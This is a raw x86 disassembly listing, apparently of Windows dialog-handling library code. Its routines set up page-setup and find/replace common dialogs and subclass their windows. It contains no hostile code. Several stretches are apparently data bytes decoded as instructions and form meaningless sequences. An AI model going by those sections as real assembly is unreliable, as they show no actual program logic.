ja r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xda ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x1 ]
jmp [ edx * 4 + jump_table_42b829 ]
mov eax [ ebp + 0x10 ]
shr eax 0x10
mov edx eax
sub edx 0x1
je r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x104 ]
push [ eax + 0x100 ]
call sub_42b704
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xf4 ]
push [ eax + 0xf0 ]
call sub_42b704
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x114 ]
push [ eax + 0x110 ]
call sub_42b704
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x10c ]
push [ eax + 0x108 ]
call sub_42b704
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xfc ]
push [ eax + 0xf8 ]
call sub_42b704
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xec ]
push [ eax + 0xe8 ]
call sub_42b704
pop ecx
mov dl 0x1
sub edx 0x2
je r-xdata
sub edx 0x8
je r-xdata
sub edx 0xe
je r-xdata
xor edx edx
jmp r-xdata
and edx 0x7f
mov dl [ edx + rw-data ]
push edx
cmp eax 0xb
setg al
and eax 0x7f
mov al [ eax + rw-data ]
push eax
lea eax [ ebp - 0x1 ]
push eax
mov cx [ ebp + 0x10 ]
and cx 0xffff
mov ebx [ rw-data ]
mov edx [ rw-data ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
jmp r-xdata
sub_42b8ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42a430
mov ax [ r-xdata ]
mov [ esi + 0x58 ] ax
mov eax esi
call sub_42bb30
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_42b936
add [ eax ] al
push ebx
push esi
push edi
add esp 0xffffffe4
mov edi eax
lea eax [ edi + 0x84 ]
xor ecx ecx
mov edx 0x54
call sub_402b40
lea esi [ edi + 0x84 ]
mov [ esi ] 0x54
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x3c ] eax
lea edx [ esi + 0xc ]
mov eax esp
call sub_42b330
mov eax [ esp ]
call sub_42b4b0
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] 0x400
lea eax [ edi + 0x84 ]
push eax
call PageSetupDlgA
mov [ esi + 0x10 ] 0x42002
mov al [ edi + 0xe0 ]
dec al
je r-xdata
add [ esi + 0x10 ] 0x8
dec al
jne r-xdata
test [ edi + 0x58 ] 0x2
je r-xdata
add [ esi + 0x10 ] 0x0
test [ edi + 0x58 ] 0x1
je r-xdata
add [ esi + 0x10 ] 0x4
jmp r-xdata
test [ edi + 0x58 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x10
test [ edi + 0x58 ] 0x8
je r-xdata
add [ esi + 0x10 ] 0x100
mov [ rw-data ] edi
mov [ esi + 0x48 ] sub_42b778
add [ esi + 0x10 ] 0x80000
jmp r-xdata
test [ edi + 0x58 ] 0x20
je r-xdata
add [ esi + 0x10 ] 0x200
test [ edi + 0x58 ] 0x10
je r-xdata
test [ edi + 0x58 ] 0x40
je r-xdata
add [ esi + 0x10 ] 0x20
test [ edi + 0x58 ] 0x80
je r-xdata
add [ esi + 0x10 ] 0x2
test [ edi + 0x59 ] 0x1
je r-xdata
inc [ esi + 0x10 ]
test [ edi + 0x59 ] 0x2
jne r-xdata
add [ esi + 0x10 ] 0x800
test [ edi + 0x59 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x80
lea ecx [ esp + 0x4 ]
mov edx [ edi + 0x80 ]
mov eax [ edi + 0x7c ]
call sub_412cac
mov eax [ esp + 0x4 ]
mov [ esi + 0x14 ] eax
mov eax [ esp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x68 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ edi + 0x64 ]
mov edx [ edi + 0x60 ]
mov eax [ edi + 0x5c ]
call sub_412cd4
push esi
push edi
lea edi [ esi + 0x1c ]
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ edi + 0x78 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ edi + 0x74 ]
mov edx [ edi + 0x70 ]
mov eax [ edi + 0x6c ]
call sub_412cd4
push esi
push edi
lea edi [ esi + 0x2c ]
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov [ esi + 0x44 ] sub_42a3c8
lea ecx [ edi + 0x84 ]
mov edx PageSetupDlgA
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
add [ esi + 0x10 ] 0x200000
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov [ edi + 0x7c ] eax
mov eax [ esi + 0x18 ]
mov [ edi + 0x80 ] eax
mov eax [ esi + 0x2c ]
mov [ edi + 0x6c ] eax
mov eax [ esi + 0x30 ]
mov [ edi + 0x70 ] eax
mov eax [ esi + 0x34 ]
mov [ edi + 0x74 ] eax
mov eax [ esi + 0x38 ]
mov [ edi + 0x78 ] eax
mov edx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
call sub_42b434
jmp r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
mov eax ebx
add esp 0x1c
pop edi
pop esi
pop ebx
retn
push eax
call GlobalFree
sub_42bb30
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov ebx eax
lea esi [ ebp - 0x55 ]
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_42bb64
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_427cc0
call sub_427820
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
xor ecx ecx
mov edx 0x54
call sub_402b40
mov [ esi ] 0x54
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x3c ] eax
mov al [ ebx + 0xe0 ]
dec al
je r-xdata
add [ esi + 0x10 ] 0x8
dec al
jne r-xdata
test [ ebx + 0x58 ] 0x2
je r-xdata
add [ esi + 0x10 ] 0x0
test [ ebx + 0x58 ] 0x1
je r-xdata
add [ esi + 0x10 ] 0x4
jmp r-xdata
test [ ebx + 0x58 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x10
test [ ebx + 0x58 ] 0x8
je r-xdata
add [ esi + 0x10 ] 0x100
test [ ebx + 0x58 ] 0x10
je r-xdata
add [ esi + 0x10 ] 0x80000
test [ ebx + 0x58 ] 0x20
je r-xdata
add [ esi + 0x10 ] 0x200
lea ecx [ ebp - 0x60 ]
mov edx [ ebx + 0x80 ]
mov eax [ ebx + 0x7c ]
call sub_412cac
mov eax [ ebp - 0x60 ]
mov [ esi + 0x14 ] eax
mov eax [ ebp - 0x5c ]
mov [ esi + 0x18 ] eax
mov eax [ ebx + 0x68 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebx + 0x64 ]
mov edx [ ebx + 0x60 ]
mov eax [ ebx + 0x5c ]
call sub_412cd4
push esi
lea edi [ esi + 0x1c ]
lea esi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebx + 0x78 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebx + 0x74 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x6c ]
call sub_412cd4
push esi
lea edi [ esi + 0x2c ]
lea esi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x44 ] sub_42a3c8
or [ esi + 0x10 ] 0x400
push esi
call PageSetupDlgA
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add [ esi + 0x10 ] 0x20
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x14 ]
mov [ ebx + 0x7c ] eax
mov eax [ esi + 0x18 ]
mov [ ebx + 0x80 ] eax
mov eax [ esi + 0x2c ]
mov [ ebx + 0x6c ] eax
mov eax [ esi + 0x30 ]
mov [ ebx + 0x70 ] eax
mov eax [ esi + 0x34 ]
mov [ ebx + 0x74 ] eax
mov eax [ esi + 0x38 ]
mov [ ebx + 0x78 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
push eax
call GlobalFree
sub_42bcd0
sbb al 0xbd
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 4 ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
mov ebp 0xbdec0042
inc edx
add [ eax ] dl
add al [ eax ]
add [ edx * 4 - 0x4e13ffbd ] ch
inc ecx
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax - 0x27ffbfcd ] al
pop ss
inc esp
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ eax + 0x780043fa ] dh
inc edi
inc esp
add [ eax + 0x1c00440f ] ah
inc edi
inc ecx
add [ esi * 8 - 0x36abffbd ] dh
inc ebx
add [ esp + edi * 8 + 0x43 ] dl
add [ edx + edx * 8 + 0x43 ] ch
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ ecx + edi * 8 + 0x428c0043 ] cl
inc esp
add [ eax - 0xbffbbb9 ] ch
inc esi
inc esp
add al cl
mov [ ebx ] sub_443d08
sub [ 0x3a400044 ] bh
inc esp
add [ eax ] dl
mov [ ebx ] sub_43c714
add al 0xf7
inc ebx
add [ eax ] dh
test [ ebx ] r-xdata
mov eax cs
inc ebx
add al ah
rol [ ebx ] cl
pop eax
rol [ ebx ] cl
insb
salc
inc ebx
add [ eax ] bl
aad 0x43
add [ eax - 0x42 ] dl
inc edx
add [ edi + esi * 8 + 0x3a940043 ] dh
inc esp
add [ eax + 0x3b ] dl
inc esp
add [ esi + esi + 0x44 ] cl
add [ ebx + edi ] dh
inc esp
add ah cl
cld
inc ebx
add [ eax + 0x3 ] ah
inc esp
add [ eax ] al
adc [ eax + eax + 0x2c ] eax
mov esi 0xde80042
inc esp
add [ eax ] bl
or al 0x44
add [ eax - 0x63ffbbef ] bl
adc [ eax + eax + 0x54 ] eax
adc [ eax + eax - 0x4 ] al
cmove eax [ eax ]
je r-xdata
je r-xdata
inc esp
add [ edx + ebx + 0x44 ] al
add [ ebp + ecx * 2 + 0x38f00044 ] dh
inc esp
add al ah
cmp eax [ eax + eax + 0x1 ]
add [ ecx ] ah
mov al 0x8c
mov esi 0x54110042
push edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0xc08b776f
add al 0xbe
inc edx
add [ edi ] al
adc [ edx + edx * 2 + 0x65 ] edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
or bh bh
push ecx
xor al 0x83
loopne r-xdata
jb r-xdata
xor edx edx
call sub_45e5dc
jmp r-xdata
mov [ ebx + 0xc ] eax
add [ eax ] al
je r-xdata
imul ebp [ esi + 0x64 ] 0xbd1c776f
inc edx
add al ah
cwde
inc ebx
add [ ebx ] cl
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax - 0xd74a9ad ] dl
mov ebx eax
mov edx esi
mov eax ebx
call sub_440aec
mov [ esi + 0x4 ] 0x90000000
mov eax [ ebx + 0x20c ]
mov [ esi + 0x1c ] eax
pop esi
pop ebx
retn
push ebp
call sub_42be94
pop ecx
mov ebx eax
mov eax ebx
pop ebx
pop ebp
retn 0x10
pop esi
pop ebx
retn
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
and eax 0x7f
sub_42be94
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetPropA
push eax
call CallWindowProcA
pop ebp
retn
sub_42bed0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e5b8
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub eax 0x80
je r-xdata
push ebp
call sub_42be94
pop ecx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45e5dc
jmp r-xdata
push ebp
call sub_42be94
pop ecx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call RemovePropA
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e5b8
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e5b8
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45e5dc
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_45e5dc
jmp r-xdata
sub_42bf84
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
call sub_42a3c8
cmp esi 0x110
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov esi [ edi + 0x1c ]
mov eax esi
call sub_42c244
inc eax
jne r-xdata
push 0x15
push 0x0
push 0x0
mov eax esi
call sub_42c2ac
push eax
mov eax esi
call sub_42c244
push eax
push 0x0
push ebx
call SetWindowPos
mov eax esi
call sub_42c2ac
inc eax
je r-xdata
push 0xfffffffc
push ebx
call GetWindowLongA
push eax
movzx eax [ rw-data ]
push eax
push ebx
call SetPropA
push sub_42bed0
push 0xfffffffc
push ebx
call SetWindowLongA
mov eax 0x1
sub_42c00c
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42a430
mov ax [ r-xdata ]
mov [ ebx + 0x58 ] ax
mov [ ebx + 0x5a ] 0xffffffff
mov [ ebx + 0x5e ] 0xffffffff
lea eax [ ebx + 0x84 ]
mov [ eax ] 0x28
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x30 ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
lea edx [ ebx + 0xac ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x18 ] 0x100
lea edx [ ebx + 0x1ac ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x1a ] 0x100
mov [ eax + 0x1c ] ebx
mov [ eax + 0x20 ] sub_42bf84
mov eax FindTextA
mov [ ebx + 0x64 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_42c0b6
add [ eax ] al
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x10
push eax
call SendMessageA
lea eax [ esi + 0x68 ]
call sub_40d1c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42a478
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x208 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_42c10c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_43a310
mov ebx eax
or edi 0xffffffff
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
xor edi edi
sub_42c148
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov [ ebx + 0x90 ] 0x100
mov [ ebx + 0xa4 ] sub_42bf84
xor ecx ecx
mov dl 0x1
mov eax [ sub_42bcd0 ]
call sub_43f98c
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x208 ] ebx
lea eax [ esi + 0x20c ]
push eax
push sub_42c10c
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebx + 0x68 ]
call sub_443c60
mov [ ebx + 0x88 ] eax
xor eax eax
mov esi rw-data
push eax
call BringWindowToTop
mov al 0x1
pop esi
pop ebx
retn
jae r-xdata
and edx 0x7f
bt [ ebx + 0x58 ] edx
inc eax
add esi 0x4
cmp al 0xd
jne r-xdata
mov edx [ esi ]
or [ ebx + 0x90 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov [ rw-data ] ebx
lea eax [ ebx + 0x84 ]
push eax
call [ ebx + 0x64 ]
mov esi eax
mov [ ebx + 0x80 ] esi
test esi esi
setne al
pop esi
pop ebx
retn
or [ ebx + 0x90 ] 0x200
mov eax [ ebx + 0x44 ]
mov [ ebx + 0xa8 ] eax
sub_42c25c
push ebx
add esp 0xfffffff0
mov ebx edx
mov edx [ eax + 0x5a ]
mov [ ebx ] edx
mov edx [ eax + 0x5e ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x80 ]
test edx edx
je r-xdata
add esp 0x10
pop ebx
retn
push esp
push edx
call GetWindowRect
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
sub_42c2c4
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_42a4ac
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
cmp edx [ rw-data ]
jne r-xdata
mov edx [ ebx + 0x8 ]
lea ecx [ edi + 0x84 ]
cmp edx ecx
jne r-xdata
mov ax [ r-xdata ]
mov [ edi + 0x58 ] ax
xor ebx ebx
mov esi rw-data
inc ebx
add esi 0x4
cmp bl 0xd
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
mov eax [ edi + 0x90 ]
and eax [ esi ]
je r-xdata
mov eax [ edi + 0x90 ]
test al 0x8
je r-xdata
and eax 0x7f
bts [ edi + 0x58 ] eax
test al 0x30
je r-xdata
mov eax edi
mov si 0xffed
call sub_403320
jmp r-xdata
test al 0x40
je r-xdata
mov eax edi
mov si 0xffec
call sub_403320
jmp r-xdata
mov al 0x1
push esp
mov eax [ edi + 0x80 ]
push eax
call GetWindowRect
mov eax [ esp ]
mov [ edi + 0x5a ] eax
mov eax [ esp + 0x4 ]
mov [ edi + 0x5e ] eax
xor eax eax
mov [ edi + 0x80 ] eax
push 0x0
push 0x0
push 0xb021
mov eax [ edi + 0x68 ]
call sub_443c60
push eax
call PostMessageA
xor eax eax
mov [ edi + 0x68 ] eax
sub_42c3bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4043b8
mov edx eax
lea eax [ ebx + 0xac ]
mov ecx 0xff
call sub_4086b0
pop esi
pop ebx
retn
sub_42c3e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4043b8
mov edx eax
lea eax [ ebx + 0x1ac ]
mov ecx 0xff
call sub_4086b0
pop esi
pop ebx
retn
sub_42c404
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42c00c
mov eax ReplaceTextA
mov [ esi + 0x64 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_42c4e8
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408ca8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42c583
add [ edi ] cl
add [ eax ] al
add [ eax + ecx * 4 + 0x47 ] cl
add [ ebp + edx * 4 + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add [ eax - 0x78 ] cl
inc edi
add [ eax + ebx * 4 + 0x47 ] ch
add [ eax ] al
inc esp
mov [ edi ] al
add al 0x95
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x78 ] al
inc edi
add [ eax ] dh
0x47 0x0
cmp al 0x88
inc edi
add ah cl
cwde
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov [ edi ] al
cmp al 0x98
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 4 ] dh
inc edi
add [ eax + 0x4799 ] ch
add [ eax ] al
add [ eax ] dh
mov [ edi ] al
cmp al 0x97
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 4 ] ch
inc edi
add [ eax + ebx * 4 + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] ch
mov [ edi ] al
jo r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 4 ] ah
inc edi
add al ch
0x47 0x0
[ edi ] eax
test al 0x95
inc edi
add [ eax ] al
add [ eax ] al
add ah ch
xchg [ edi ] eax
adc [ edx + 0x47 ] bl
add [ eax ] al
call 0x6c430db0
0x47 0x0
in al 0x87
inc edi
add ah dl
xchg edi eax
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42c68e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c695
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404980
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_42c698
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c48
call sub_42c4e8
mov eax [ r-xdata ]
call sub_413944
mov eax [ r-xdata ]
call sub_4139e4
mov edx [ r-xdata ]
mov eax [ sub_428e00 ]
call sub_413990
sub_42ce5a
inc esp
add [ eax ] bl
or al 0x44
add [ eax - 0x63ffbbef ] bl
adc [ eax + eax + 0x54 ] eax
adc [ eax + eax - 0x4 ] al
cmove eax [ eax ]
je r-xdata
inc edx
add [ ebp + ebp * 8 + 0x42 ] bl
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
inc esp
add [ eax ] ah
pop ecx
inc esp
add [ edi + ebp * 8 ] ah
inc edx
add al dh
cmp [ eax + eax - 0x20 ] al
cmp eax [ eax + eax + 0x50 ]
jmp r-xdata
mov esp 0xd8004030
xor [ eax ] al
rcr [ eax + 0x44 ] 0x1
je r-xdata
or al 0x54
inc ebx
jne r-xdata
add [ eax + 0x47 ] bh
inc esp
add [ eax + 0x1c00440f ] ah
inc esp
add [ eax + esi + 0x30d80040 ] bh
inc eax
add al dl
pop eax
inc esp
insd
push eax
popad
outsb
insb
lea eax [ eax ]
enter 0x42ce 0x0
pop es
inc edi
je r-xdata
inc ecx
add [ esi * 8 - 0x36abffbd ] dh
inc ebx
add [ esp + edi * 8 + 0x43 ] dl
add [ edx + edx * 8 + 0x43 ] ch
add [ edx + esi * 4 ] al
inc ecx
add ah ch
add [ edi + eax * 2 ] bl
insd
push eax
popad
outsb
insb
mov esp 0x580042cd
fwait
inc ebx
add [ ebx ] cl
add [ eax ] cl
inc ebp
js r-xdata
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax + ebp * 8 + 0x428c0042 ] ah
inc esp
add al bh
out dx al
inc edx
add ah dh
inc esi
inc esp
add al cl
mov [ ebx ] sub_443d08
sub [ 0x3a400044 ] bh
inc esp
add [ eax ] dl
mov [ ebx ] sub_43c714
add al 0xf7
inc ebx
add [ eax ] dh
test [ ebx ] r-xdata
mov eax cs
inc ebx
add al ah
rol [ ebx ] cl
pop eax
rol [ ebx ] cl
insb
salc
inc ebx
add [ eax ] bl
aad 0x43
add [ esi + edx + 0x44 ] dh
add [ edi + esi * 8 + 0x3a940043 ] dh
inc esp
add [ eax + 0x3b ] dl
inc esp
add [ esi + esi + 0x44 ] cl
add [ ebx + edi ] dh
inc esp
add [ ebp + ebp * 8 + 0x42 ] ah
add [ eax + 0x3 ] ah
inc esp
add [ eax ] al
adc [ eax + eax + 0x68 ] eax
jmp 0xe2ad018
in al dx
inc ebx
je r-xdata
insb
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 8 ] al
inc edx
add [ eax ] ch
add al [ eax ]
add [ eax - 0x33 ] dh
inc edx
add ah ch
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax - 0x27ffbfcd ] al
pop ss
sub_42cfd6
inc esp
add [ eax ] bl
or al 0x44
add [ eax - 0x63ffbbef ] bl
adc [ eax + eax + 0x54 ] eax
adc [ eax + eax - 0x4 ] al
cmove eax [ eax ]
je r-xdata
jae r-xdata
inc esp
add [ eax ] ah
pop ecx
inc esp
add [ edi + ebp * 8 ] ah
inc edx
add al dh
cmp [ eax + eax - 0x20 ] al
cmp eax [ eax + eax + 0x50 ]
jmp r-xdata
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
nop
xchg [ ebx ] al
popad
add [ eax ] al
add [ eax + 0x7f ] ch
inc ebx
add [ ebx ] bl
add bh bh
cwde
leave
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
int3
sub_42d079
fadd st7
inc ebx
add [ eax + ecx * 8 + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
adc ch ch
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
inc eax
adc al 0x41
add [ edi ] bl
add bh bh
jo r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ edx ] eax
add bh bh
fsubr st4
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
inc ebx
jb r-xdata
add dh bh
test al 0xd5
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080012 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7865646f
xchg esp eax
inc ebx
add [ eax ] bl
add al [ eax ]
[ ebp * 8 + 0x10042 ]
add [ eax ] al
adc [ edx ] 0x0
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x94786564
insb
dec ecx
outsb
outsb
jb r-xdata
inc ebx
